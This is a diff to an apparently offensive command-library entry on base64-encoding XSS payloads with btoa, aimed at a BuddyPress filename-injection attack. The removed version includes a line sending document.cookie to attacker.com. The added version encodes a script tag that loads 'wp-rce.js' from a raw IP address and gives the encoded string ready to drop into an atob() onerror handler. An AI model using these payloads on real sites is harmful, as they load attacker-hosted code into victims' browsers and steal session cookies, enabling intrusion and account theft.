@@ -1,60 +1,62 @@
 ---
-id: 123e4567-e89b-12d3-a456-426614174005
-name: btoa-payload-encode
-type: command
-executor: javascript
+id: cmd-001
 data: >-
-  let
-  payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`)
-output: Base64-encoded string of the payload.
-created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-13T23:55:06.693Z'
+  btoa('Running POC<script type="text/javascript"
+  src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
+tags:
+  - encoding
+  - xss
+  - payload
+type: command
+output: >-
+  UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=
+executor: javascript
 platforms:
   - Web
-tags:
-  - xss
-  - encoding
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:23:32.418Z'
 verified: false
 validated: true
 submitted: true
 ---
-
-# btoa-payload-encode
+# btoa Payload Encode
 
 ## Command
 
 ```javascript
-let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`)
+btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
 ```
 
 ## Description
 
-Base64-encodes a JavaScript payload that sends a success message to the opener window and alerts the current domain, used for injection via eval in the XSS exploit.
+This JavaScript command uses the built-in btoa() function in the browser console to base64-encode a string payload for embedding in an XSS attack, specifically for the BuddyPress filename injection to obfuscate the script tag.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| string | The JS code to encode (window.opener.postMessage...alert(document.domain)) | Yes |
+| input string | The plaintext to encode, including HTML/script tags | Yes |
 
 ## Examples
 
 ### Basic Usage
 
 ```javascript
-let payload = btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
+btoa('Running POC<script type="text/javascript" src="http://159.203.190.123/w9rfas89eufs9e8fu98ewufjwefiojwe_s1058g-/wp-rce.js"></script>');
 ```
 
 ### Advanced Usage
 
+For custom payloads:
+
 ```javascript
-let customPayload = btoa(`fetch('https://attacker.com/steal?cookie=' + document.cookie);`);
+btoa('Custom alert(1)<script src="evil.js"></script>');
 ```
 
 ## Expected Output
 
-A base64 string, e.g., "d2luZG93Lm9wZW5lci5wb3N0TWVzc2FnZSgnc3VjY2VzcycsbG9jYXRpb24ub3JpZ2luKTthbGVydChkb2N1bWVudC5kb21haW4p".
+Base64-encoded string: UnVubmluZyBQT0M8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vMTU5LjIwMy4xOTAuMTIzL3c5cmZhczg5ZXVmczllOGZ1OThld3VmandlZmlvandlX3MxMDU4Zy0vd3AtcmNlLmpzIj48L3NjcmlwdD4=. This is inserted into the atob() call in the XSS onerror handler.
 
 ## Related
 
-- [[Related Procedure|procedures/Modify-Store-Theme-to-Inject-Malicious-Script]]
+- [[Related Procedure: Upload-Malicious-Filename-for-XSS]]
